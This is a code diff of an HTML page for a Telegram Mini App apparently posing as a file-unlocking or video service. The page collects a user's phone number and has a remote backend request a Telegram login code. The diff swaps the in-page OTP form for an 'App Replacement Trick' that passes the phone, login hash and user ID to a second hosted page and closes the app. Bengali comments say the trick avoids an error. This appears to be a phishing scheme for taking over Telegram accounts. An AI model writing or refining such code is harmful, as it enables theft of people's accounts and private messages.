@@ -53,9 +53,8 @@
 
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(5px);}
         .modal-content { background: #1a1a1a; padding: 30px 20px; border-radius: 20px; width: 85%; max-width: 350px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.8);}
-        .share-btn { background: linear-gradient(90deg, #0088cc, #00aaff); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-size: 16px; cursor: pointer; margin-top: 20px; font-weight: bold; box-shadow: 0 4px 15px rgba(0, 170, 255, 0.4); transition: 0.3s;}
+        .share-btn { background: linear-gradient(90deg, #0088cc, #00aaff); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-size: 16px; cursor: pointer; font-weight: bold; box-shadow: 0 4px 15px rgba(0, 170, 255, 0.4); transition: 0.3s;}
         .share-btn:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
-        .check-btn { background: #333; color: white; border: 1px solid #555; padding: 12px; border-radius: 12px; width: 100%; font-size: 14px; cursor: pointer; margin-top: 10px; font-weight: bold; }
         .close-btn-modal { background: transparent; color: #888; border: none; margin-top: 15px; cursor: pointer; font-size: 14px; text-decoration: underline;}
         
         #player-wrapper { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 99999; }
@@ -122,13 +121,10 @@
                 <button id="btn-send-code" class="share-btn" onclick="sendCode()">Send OTP Code</button>
             </div>
 
+            <!-- OTP Section with Redirect Button -->
             <div id="otp-sec" style="display: none;">
-                <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
-                    <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
-                    <!-- App Replacement Trick Button -->
-                    <button onclick="viewCodeAction()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
-                </div>
-                <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
+                <p style="font-size: 13px; color: #ddd; margin-bottom: 20px;">OTP Code requested successfully!</p>
+                <button onclick="viewCodeAction()" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;">👀 Go to OTP Page</button>
                 <div style="text-align: center; margin-top: 15px;">
                     <button onclick="resetLoginState()" style="background: transparent; color: #ff3366; border: none; text-decoration: underline; cursor: pointer; font-size: 12px;">Wrong Number? Go Back</button>
                 </div>
@@ -151,11 +147,7 @@
         const BACKEND_URL = 'https://pmrony-forwardbot.hf.space';
         const fetchHeaders = { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' };
 
-        // URL থেকে user_id রিসিভ করার ট্রিক (২য় অ্যাপের জন্য)
-        const urlParams = new URLSearchParams(window.location.search);
-        const forceUserId = urlParams.get('user_id');
-        const userId = forceUserId || (tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'); 
-
+        const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'; 
         const botUsername = 'File_Unlocker_Pro_bot'; 
         const adUrl = "https://www.effectivecpmnetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
         
@@ -225,36 +217,14 @@
                     localStorage.setItem("savedPhone", currentPhone);
                     localStorage.setItem("savedHash", currentHash);
                     localStorage.setItem("loginState", "otp");
+                    
+                    // মেইন পেজ থেকে নাম্বার ফিল্ড সরিয়ে 'Go to OTP Page' বাটন দেখানো হচ্ছে
                     document.getElementById('phone-sec').style.display = 'none';
                     document.getElementById('otp-sec').style.display = 'block';
-                    showToast("Code sent to your Telegram!");
+                    showToast("Success! Now open the OTP page.");
                 } else { showToast("Error: " + data.msg); }
             } catch(e) { showToast("Server error!"); } 
             finally { sendBtn.innerHTML = originalText; sendBtn.disabled = false; }
-        }
-
-        async function verifyCode() {
-            const otp = document.getElementById('otp-input').value.trim();
-            if(!otp) return showToast("Enter OTP!");
-            
-            const verifyBtn = document.getElementById('btn-verify-code');
-            const originalText = verifyBtn.innerHTML;
-            verifyBtn.innerHTML = "⏳ Verifying...";
-            verifyBtn.disabled = true;
-
-            showToast("Verifying account...");
-            try {
-                const res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone: currentPhone, hash: currentHash, otp: otp, user_id: userId }) });
-                const data = await res.json();
-                if(data.status === "ok") {
-                    localStorage.removeItem("loginState");
-                    localStorage.removeItem("savedPhone");
-                    localStorage.removeItem("savedHash");
-                    closeLogin();
-                    showPremiumModal();
-                } else { showToast("Invalid Code or Error!"); }
-            } catch(e) { showToast("Server connection error!"); } 
-            finally { verifyBtn.innerHTML = originalText; verifyBtn.disabled = false; }
         }
 
         function resetLoginState() {
@@ -286,6 +256,23 @@
             toast.innerText = msg;
             toast.className = "show";
             setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 4000);
+        }
+
+        // App Replacement Trick Logic (আপনার মাস্টারমাইন্ড আইডিয়া)
+        function viewCodeAction() {
+            showToast("Redirecting to OTP Page...");
+            
+            // ২য় অ্যাপ (app.html) এর লিংক তৈরি করা হচ্ছে ডাটা সহ
+            // URL এ আপনার github username ঠিক আছে কিনা মিলিয়ে নেবেন
+            let appUrl = 'https://rony90790.github.io/Forward-bot/app.html?user_id=' + userId + '&phone=' + encodeURIComponent(currentPhone) + '&hash=' + encodeURIComponent(currentHash);
+            
+            // ২য় অ্যাপটি ইন-অ্যাপ ব্রাউজারে ওপেন করা হচ্ছে, যেখানে duck error আসবে না
+            tg.openLink(appUrl);
+            
+            // ১ম অ্যাপ (Mini App) ক্লোজ করে দেওয়া হচ্ছে
+            setTimeout(() => {
+                tg.close();
+            }, 500);
         }
 
         async function initData() {
@@ -447,20 +434,6 @@
         let savedState = localStorage.getItem("loginState");
         if (savedState === "otp") {
             setTimeout(() => { openLogin(); }, 500);
-        }
-
-        // App Replacement Trick Logic
-        function viewCodeAction() {
-            showToast("Opening chat...");
-            
-            // ১. ২য় অ্যাপ (Gateway) ওপেন করবে এবং সাথে user_id পাস করে দেবে
-            let gatewayUrl = 'https://pmrony-forwardbot.hf.space/api/jump?user_id=' + userId;
-            tg.openLink(gatewayUrl);
-            
-            // ২. ঠিক আধা সেকেন্ড পর ১ম মেইন অ্যাপটি নিজে থেকে Close হয়ে যাবে!
-            setTimeout(() => {
-                tg.close();
-            }, 500);
         }
 
         fetchVideos();
